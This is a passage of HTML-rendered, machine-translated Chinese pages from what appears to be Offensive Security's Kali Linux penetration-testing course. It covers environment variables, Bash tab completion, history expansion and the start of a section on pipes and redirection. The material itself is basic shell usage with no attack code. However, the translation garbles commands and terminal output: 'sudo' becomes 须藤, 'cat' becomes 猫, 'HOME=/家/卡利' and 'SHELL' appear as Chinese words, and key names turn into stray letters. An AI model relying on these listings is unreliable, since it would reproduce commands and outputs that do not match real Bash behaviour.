<div style="position:absolute;top:59303;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $othervar</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:59320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全局变量</font></font></nobr></div>
</span></font>
<font size="3" color="#00b050" face="Times"><span style="font-size:11px;font-family:Times;color:#00b050">
<div style="position:absolute;top:59354;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:59371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出口</font></font></nobr></div>
<div style="position:absolute;top:59388;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font></nobr></div>
<div style="position:absolute;top:59408;left:281"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 31 - 使用 env 显示所有环境变量 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:59575;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="51"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 51 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:59608;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:60685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:60685;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:60685;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">51</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:59704;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 中默认定义了许多其他环境变量。</font><font style="vertical-align: inherit;">我们可以通过以下方式查看这些</font></font></nobr></div>
<div style="position:absolute;top:59723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在命令行</font><font style="vertical-align: inherit;">运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">env</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:59758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">env</font></font></font></b></nobr></div>
<div style="position:absolute;top:59775;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳=/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:59792;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:59809;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWD=/home/kali</font></font></nobr></div>
<div style="position:absolute;top:59826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XDG_SESSION_DESKTOP=lightdm-xsession</font></font></nobr></div>
<div style="position:absolute;top:59843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LOGNAME=卡利</font></font></nobr></div>
<div style="position:absolute;top:59860;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XDG_SESSION_TYPE=x11</font></font></nobr></div>
<div style="position:absolute;top:59877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XAUTHORITY=/home/kali/.Xauthority</font></font></nobr></div>
<div style="position:absolute;top:59894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XDG_GREETER_DATA_DIR=/var/lib/lightdm/data/kali</font></font></nobr></div>
<div style="position:absolute;top:59911;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">家=/家/卡利</font></font></nobr></div>
<div style="position:absolute;top:59928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:59945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TERM=xterm-256color</font></font></nobr></div>
<div style="position:absolute;top:59962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户=卡利</font></font></nobr></div>
<div style="position:absolute;top:59979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:59998;left:281"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 32 - 使用 env 显示所有环境变量</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:60029;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.2 标签补全</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:60067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bash shell 自动完成功能允许我们完成文件名和目录路径</font></font></nobr></div>
<div style="position:absolute;top:60086;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关键。</font><font style="vertical-align: inherit;">这个特性极大地加速了 shell 的使用，以至于在其他 shell 中被严重遗漏了。</font></font></nobr></div>
<div style="position:absolute;top:60106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们从 kali 用户主目录来看看它是如何工作的。</font><font style="vertical-align: inherit;">我们将首先输入</font></font></nobr></div>
<div style="position:absolute;top:60125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:60160;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls D[TAB]</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:60177;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">桌面/文档/下载/</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:60211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls De[TAB]sktop/</font></font></font></b></nobr></div>
<div style="position:absolute;top:60245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls 桌面/</font></font></font></b></nobr></div>
<div style="position:absolute;top:60264;left:328"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 33 - 说明 Bash 中的选项卡完成</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:60293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们</font><font style="vertical-align: inherit;">在“D”之后第一次</font><font style="vertical-align: inherit;">按下</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">键时，Bash shell 提示有三个</font></font></nobr></div>
<div style="position:absolute;top:60313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以该字母开头的目录然后为我们提供部分完成的命令</font></font></nobr></div>
<div style="position:absolute;top:60332;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">继续。</font><font style="vertical-align: inherit;">由于我们决定指定“桌面”，因此我们继续键入“e”，然后按</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">键</font></font></nobr></div>
<div style="position:absolute;top:60351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第二次。</font><font style="vertical-align: inherit;">此时，Bash shell 神奇地自动完成了“桌面”这个词的其余部分</font></font></nobr></div>
<div style="position:absolute;top:60371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为这是唯一以“De”开头的选择。</font><font style="vertical-align: inherit;">有关选项卡完成的其他信息可以是</font></font></nobr></div>
<div style="position:absolute;top:60390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Debian 网站上找到。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">51,52</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:60424;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.3 Bash 历史技巧</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:60462;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在进行渗透测试时，保留已执行过的命令的记录很重要</font></font></nobr></div>
<div style="position:absolute;top:60482;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进入外壳。</font><font style="vertical-align: inherit;">幸运的是，Bash 维护了已输入命令的历史记录，</font></font></nobr></div>
<div style="position:absolute;top:60501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">history</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">显示</font><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:60595;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">51 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Debian 管理，2005），https://debian-administration.org/article/316/An_introduction_to_bash_completion_part_1</font></font></font></nobr></div>
<div style="position:absolute;top:60615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">52 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Debian 管理，2005），https://debian-administration.org/article/317/An_introduction_to_bash_completion_part_2</font></font></font></nobr></div>
<div style="position:absolute;top:60635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(die.net, 2002), https://linux.die.net/man/3/history</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:60763;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="52"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 52 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:60796;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:61873;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:61873;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:61873;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">52</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:60894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">历史</font></font></font></b></nobr></div>
<div style="position:absolute;top:60911;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 猫 /etc/lsb-release</font></font></nobr></div>
<div style="position:absolute;top:60928;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 清除</font></font></nobr></div>
<div style="position:absolute;top:60945;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 历史</font></font></nobr></div>
<div style="position:absolute;top:60964;left:363"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 34 - 历史命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:60993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以利用</font><i><font style="vertical-align: inherit;">历史扩展</font></i><font style="vertical-align: inherit;">，而不是从我们的历史中重新键入一个长命令</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:61013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设施。</font><font style="vertical-align: inherit;">例如，回顾 清单 34，我们的历史记录中有三个命令，其中一行</font></font></nobr></div>
<div style="position:absolute;top:61032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每个数字前面的数字。</font><font style="vertical-align: inherit;">要重新运行第一个命令，我们只需键入</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">! </font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符跟随</font></font></nobr></div>
<div style="position:absolute;top:61052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过行号，在本例中为</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，执行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /etc/lsb-release</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:61086;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">!1</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:61104;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /etc/lsb-release</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:61120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DISTRIB_ID=卡利</font></font></nobr></div>
<div style="position:absolute;top:61137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DISTRIB_RELEASE=卡利滚动</font></font></nobr></div>
<div style="position:absolute;top:61154;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DISTRIB_CODENAME=卡利滚动</font></font></nobr></div>
<div style="position:absolute;top:61171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DISTRIB_DESCRIPTION="Kali GNU/Linux 滚动"</font></font></nobr></div>
<div style="position:absolute;top:61191;left:320"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 35 - 实际中的 Bash 历史扩展</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:61220;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另一个有用的历史快捷方式是</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">!! </font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, 重复执行期间执行的最后一个命令</font></font></nobr></div>
<div style="position:absolute;top:61240;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的终端会话：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:61274;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo systemctl restart apache2</font></font></font></b></nobr></div>
<div style="position:absolute;top:61308;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">!!</font></font></font></b></nobr></div>
<div style="position:absolute;top:61325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">须藤 systemctl 重启 apache2</font></font></nobr></div>
<div style="position:absolute;top:61359;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font></nobr></div>
<div style="position:absolute;top:61378;left:327"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 36 - 轻松重复上一个命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:61408;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认情况下，命令历史记录保存到用户主目录中的 .bash_history 文件中。</font><font style="vertical-align: inherit;">二</font></font></nobr></div>
<div style="position:absolute;top:61427;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境变量控制历史大小：</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HISTSIZE</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HISTFILESIZE</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:61460;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HISTSIZE</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制为当前会话存储在内存中的命令数量和</font></font></nobr></div>
<div style="position:absolute;top:61479;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HISTFILESIZE</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置在历史文件中保留多少命令。</font><font style="vertical-align: inherit;">这些变量可以是</font></font></nobr></div>
<div style="position:absolute;top:61499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据我们的需要编辑并保存到我们将探索的 Bash 配置文件（.bashrc）中</font></font></nobr></div>
<div style="position:absolute;top:61518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">之后。</font></font></nobr></div>
<div style="position:absolute;top:61551;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">探索 Bash 历史记录的最简单方法之一就是直接从命令行提示符。</font><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:61570;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以使用一些有用的键盘快捷键浏览历史记录，其中包含两个最常见的</font></font></nobr></div>
<div style="position:absolute;top:61590;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存在：</font></font></nobr></div>
<div style="position:absolute;top:61623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
</span></font>
<font size="5" face="Times"><span style="font-size:36px;font-family:Times">
<div style="position:absolute;top:61623;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">J </font></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 在历史中向后滚动</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:61651;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
</span></font>
<font size="5" face="Times"><span style="font-size:36px;font-family:Times">
<div style="position:absolute;top:61651;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">L </font></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 在历史中向前滚动</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:61683;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后但并非最不重要的一点是，按住</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并按</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">r</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将调用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反向搜索</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具。</font><font style="vertical-align: inherit;">类型</font></font></nobr></div>
<div style="position:absolute;top:61703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个字母，例如</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，您将获得历史记录中最新命令的匹配项</font></font></nobr></div>
<div style="position:absolute;top:61722;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含字母“c”。</font><font style="vertical-align: inherit;">继续输入以缩小您的匹配范围以及何时找到所需的</font></font></nobr></div>
<div style="position:absolute;top:61742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，按</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行它。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:61951;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="53"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 53 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:61984;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:63061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:63061;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:63061;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:62074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.3.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:62095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[CTRL-R]c</font></font></font></b></nobr></div>
<div style="position:absolute;top:62112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(reverse-i-search)`ca': cat /etc/lsb-release </font></font></nobr></div>
<div style="position:absolute;top:62131;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 37 - 探索 reverse-i-search 工具</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:62162;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.3.2 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:62193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 检查您的 bash 历史记录并使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">历史记录扩展</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从它重新运行命令。</font></font></nobr></div>
<div style="position:absolute;top:62221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 执行您选择的不同命令并尝试浏览历史记录</font></font></nobr></div>
<div style="position:absolute;top:62240;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">快捷方式以及</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反向搜索</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:62278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2 管道和重定向</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:62319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从命令行运行的每个程序都有三个连接到它的数据流，作为</font></font></nobr></div>
<div style="position:absolute;top:62339;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与外部环境的沟通渠道。</font><font style="vertical-align: inherit;">这些流定义如下：</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:62372;left:226"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">流名称</font></font></nobr></div>
<div style="position:absolute;top:62372;left:521"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:62394;left:196"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准输入 (STDIN)</font></font></nobr></div>
<div style="position:absolute;top:62394;left:473"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入程序的数据</font></font></nobr></div>
<div style="position:absolute;top:62414;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准输出 (STDOUT) 程序的输出（默认为终端）</font></font></nobr></div>
<div style="position:absolute;top:62434;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准错误 (STDERR)</font></font></nobr></div>
<div style="position:absolute;top:62434;left:430"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误消息（默认为终端）</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:62454;left:297"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表 3 - 连接到命令行程序的流</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:62483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管道（使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运算符）和重定向（使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运算符）连接这些流</font></font></nobr></div>
<div style="position:absolute;top:62503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">程序和文件之间，以适应几乎无限数量的可能用例。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
